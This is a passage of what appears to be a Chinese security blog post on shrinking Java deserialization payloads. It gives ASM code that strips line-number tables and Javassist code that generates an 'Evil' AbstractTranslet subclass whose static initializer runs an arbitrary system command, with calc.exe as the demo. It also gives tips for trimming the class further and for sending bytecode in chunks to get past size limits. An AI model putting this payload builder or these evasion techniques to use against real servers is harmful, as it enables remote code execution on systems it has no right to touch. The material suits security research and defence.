+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.objectweb.asm.Label;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.Opcodes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoveLineNumberMethodVisitor</span> <span class="keyword">extends</span> <span class="title class_">MethodVisitor</span> <span class="keyword">implements</span> <span class="title class_">Opcodes</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RemoveLineNumberMethodVisitor</span><span class="params">(MethodVisitor mv)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(Opcodes.ASM9, mv);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitLineNumber</span><span class="params">(<span class="type">int</span> line, Label start)</span> &#123;</span><br><span class="line">        <span class="comment">// 直接跳过，不处理行号信息</span></span><br><span class="line">        <span class="comment">// super.visitLineNumber(line, start); // 注释掉此行以删除 LineNumberTable</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最终处理实现</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.objectweb.asm.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LineNumberRemover</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] removeLineNumbers(<span class="type">byte</span>[] classData) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">cr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(classData);</span><br><span class="line">        <span class="type">ClassWriter</span> <span class="variable">cw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassWriter</span>(cr, ClassWriter.COMPUTE_MAXS);</span><br><span class="line">        <span class="type">ClassVisitor</span> <span class="variable">cv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoveLineNumberClassVisitor</span>(cw);</span><br><span class="line">        cr.accept(cv, ClassReader.EXPAND_FRAMES);</span><br><span class="line">        <span class="keyword">return</span> cw.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 示例：从文件读取类，删除行号表后写回</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">inputClassPath</span> <span class="operator">=</span> <span class="string">&quot;Class.class&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">outputClassPath</span> <span class="operator">=</span> <span class="string">&quot;NoLineNumber.class&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读取原始类文件</span></span><br><span class="line">        <span class="type">byte</span>[] originalClass = readFile(inputClassPath);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 删除 LineNumberTable</span></span><br><span class="line">        <span class="type">byte</span>[] modifiedClass = removeLineNumbers(originalClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写入新文件</span></span><br><span class="line">        writeFile(outputClassPath, modifiedClass);</span><br><span class="line">        System.out.println(<span class="string">&quot;LineNumberTable removed successfully!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] readFile(String path) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path);</span><br><span class="line">             <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>()) &#123;</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>]; </span><br><span class="line">            <span class="type">int</span> len;</span><br><span class="line">            <span class="keyword">while</span> ((len = fis.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                bos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> bos.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">(String path, <span class="type">byte</span>[] data)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(path)) &#123;</span><br><span class="line">            fos.write(data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>测试</strong></p>
+<p>​<img src="https://aiyakami.github.io/about/11/network-asset-asynccode-20250412142849-ccbftnl.png">​</p>
+<p>有趣的是使用ASM删除只小了0.06kb么，远不如直接加编译命令</p>
+<p>​<img src="https://aiyakami.github.io/about/11/network-asset-asynccode-20250412142849-raswymv.png">​</p>
+<h3 id="使用Javassist构造POC"><a href="#使用Javassist构造POC" class="headerlink" title="使用Javassist构造POC"></a>使用Javassist构造POC</h3><p>实际上javassist和ASM本质能算同一种，控制层级不同</p>
+<p>​<img src="https://aiyakami.github.io/about/11/network-asset-asynccode-20250412142849-n66l1a5.png">​</p>
+<p>不是对编译后的class文件下手，而在编译时直接控制，对比编译命令而言的好处是控制权更大</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superClass);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">        constructor.setBody(<span class="string">&quot;        try &#123;\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;            Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        &#125; catch (Exception ignored) &#123;\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        &#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod1</span> <span class="operator">=</span> CtMethod.make(<span class="string">&quot;    public void transform(&quot;</span> +</span><br><span class="line">                                           <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.DOM document, &quot;</span> +</span><br><span class="line">                                           <span class="string">&quot;com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) &#123;\n&quot;</span> +</span><br><span class="line">                                           <span class="string">&quot;    &#125;&quot;</span>, ctClass);</span><br><span class="line">        ctClass.addMethod(ctMethod1);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod2</span> <span class="operator">=</span> CtMethod.make(<span class="string">&quot;    public void transform(&quot;</span> +</span><br><span class="line">                                           <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.DOM document, &quot;</span> +</span><br><span class="line">                                           <span class="string">&quot;com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, &quot;</span> +</span><br><span class="line">                                           <span class="string">&quot;com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) &#123;\n&quot;</span> +</span><br><span class="line">                                           <span class="string">&quot;    &#125;&quot;</span>, ctClass);</span><br><span class="line">        ctClass.addMethod(ctMethod2);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        ctClass.defrost();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="删除重写方法"><a href="#删除重写方法" class="headerlink" title="删除重写方法"></a>删除重写方法</h3><p>正常来说Evil类继承自AbstractTranslet抽象类，所以必须重写两个transform方法，但实际上这两个重写方法不存在也可以执行代码，仍然可以使用ASM对编译后的类的重写方法进行删除进行一个删除</p>
+<p>这里使用javassist在构造类时就不加重写方法测试</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClassGenerator</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成恶意类的字节码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> cmd 要执行的系统命令</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 类的字节码</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplatesImpl(String cmd) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 设置父类为 AbstractTranslet（常用于漏洞利用）</span></span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 添加静态初始化块（类加载时执行命令）</span></span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">            constructor.setBody(<span class="string">&quot;try &#123; Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd.replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) + <span class="string">&quot;\&quot;); &#125; catch (Exception e) &#123;&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 添加无参构造函数（避免序列化问题）</span></span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">defaultConstructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[<span class="number">0</span>], ctClass);</span><br><span class="line">            defaultConstructor.setBody(<span class="string">&quot;&#123;&#125;&quot;</span>);</span><br><span class="line">            ctClass.addConstructor(defaultConstructor);</span><br><span class="line"></span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.detach(); <span class="comment">// 释放资源</span></span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将字节码写入.class文件</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">saveClassToFile</span><span class="params">(<span class="type">byte</span>[] bytecode, String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(filename);</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(path.toFile())) &#123;</span><br><span class="line">            fos.write(bytecode);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] 文件已保存至: &quot;</span> + path.toAbsolutePath());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. 生成恶意类字节码（执行calc.exe）</span></span><br><span class="line">        <span class="type">byte</span>[] evilClass = getTemplatesImpl(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 保存为.class文件</span></span><br><span class="line">        saveClassToFile(evilClass, <span class="string">&quot;Evil.class&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里生成的evil2比之前还小一半</p>
+<p>​<img src="https://aiyakami.github.io/about/11/network-asset-asynccode-20250412142850-210symo.png">​</p>
+<p>反序列化evil2仍然能执行</p>
+<p>​<img src="https://aiyakami.github.io/about/11/network-asset-asynccode-20250412142850-ibskvhx.png">​</p>
+<h3 id="从构造方法和静态代码块下手"><a href="#从构造方法和静态代码块下手" class="headerlink" title="从构造方法和静态代码块下手"></a>从构造方法和静态代码块下手</h3><p>代码从静态代码块（<code>&lt;clinit&gt;</code>​）移到空参构造方法（<code>&lt;init&gt;</code>​）中是完全可行的，且能正常运行</p>
+<p>所以如果同时存在空参构造方法和静态代码块，可以将其合并，减少空间</p>
+<h2 id="使用分块传输手段"><a href="#使用分块传输手段" class="headerlink" title="使用分块传输手段"></a>使用分块传输手段</h2><p>在实战中，绕过限制通常采用打入自定义的Classloader加字节码分段传输的手段</p>
+<p>用追加的方式发送多个请求往指定文件中写入字节码，将真正需要执行的字节码分块</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/covers/7.jpg" data-sizes="auto" alt="cobalt strike后门木马shellcode分析" class="lazyload">
+        
+      
+      <a href="/2025/02/10/cobalt%20strike%E5%90%8E%E9%97%A8%E6%9C%A8%E9%A9%ACshellcode%E5%88%86%E6%9E%90/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          cobalt strike后门木马shellcode分析
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96payload%E7%BC%A9%E5%B0%8F%E6%8A%80%E6%9C%AF"><span class="toc-number">1.</span> <span class="toc-text">反序列化payload缩小技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E%E5%AD%97%E8%8A%82%E7%A0%81%E5%B1%82%E9%9D%A2%E4%BC%98%E5%8C%96"><span class="toc-number">1.1.</span> <span class="toc-text">从字节码层面优化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%91%BD%E4%BB%A4%E5%8E%BB%E9%99%A4LineNumberTable"><span class="toc-number">1.1.1.</span> <span class="toc-text">直接通过编译命令去除LineNumberTable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EASM%E5%AE%9E%E7%8E%B0%E5%88%A0%E9%99%A4LINENUMBER"><span class="toc-number">1.1.2.</span> <span class="toc-text">基于ASM实现删除LINENUMBER</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Javassist%E6%9E%84%E9%80%A0POC"><span class="toc-number">1.1.3.</span> <span class="toc-text">使用Javassist构造POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E9%87%8D%E5%86%99%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.4.</span> <span class="toc-text">删除重写方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E5%92%8C%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E5%9D%97%E4%B8%8B%E6%89%8B"><span class="toc-number">1.1.5.</span> <span class="toc-text">从构造方法和静态代码块下手</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E6%89%8B%E6%AE%B5"><span class="toc-number">1.2.</span> <span class="toc-text">使用分块传输手段</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="aiyakami" class="lazyload">
+  <div class="sidebar-author-name">aiyakami</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">14</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep"></span>
+      aiyakami
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        23.2k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        01:44
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" alt="backtop" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96payload%E7%BC%A9%E5%B0%8F%E6%8A%80%E6%9C%AF"><span class="toc-number">1.</span> <span class="toc-text">反序列化payload缩小技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E%E5%AD%97%E8%8A%82%E7%A0%81%E5%B1%82%E9%9D%A2%E4%BC%98%E5%8C%96"><span class="toc-number">1.1.</span> <span class="toc-text">从字节码层面优化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E9%80%9A%E8%BF%87%E7%BC%96%E8%AF%91%E5%91%BD%E4%BB%A4%E5%8E%BB%E9%99%A4LineNumberTable"><span class="toc-number">1.1.1.</span> <span class="toc-text">直接通过编译命令去除LineNumberTable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8EASM%E5%AE%9E%E7%8E%B0%E5%88%A0%E9%99%A4LINENUMBER"><span class="toc-number">1.1.2.</span> <span class="toc-text">基于ASM实现删除LINENUMBER</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Javassist%E6%9E%84%E9%80%A0POC"><span class="toc-number">1.1.3.</span> <span class="toc-text">使用Javassist构造POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E9%87%8D%E5%86%99%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.4.</span> <span class="toc-text">删除重写方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E5%92%8C%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E5%9D%97%E4%B8%8B%E6%89%8B"><span class="toc-number">1.1.5.</span> <span class="toc-text">从构造方法和静态代码块下手</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E6%89%8B%E6%AE%B5"><span class="toc-number">1.2.</span> <span class="toc-text">使用分块传输手段</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="aiyakami" class="lazyload">
+  <div class="sidebar-author-name">aiyakami</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">14</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
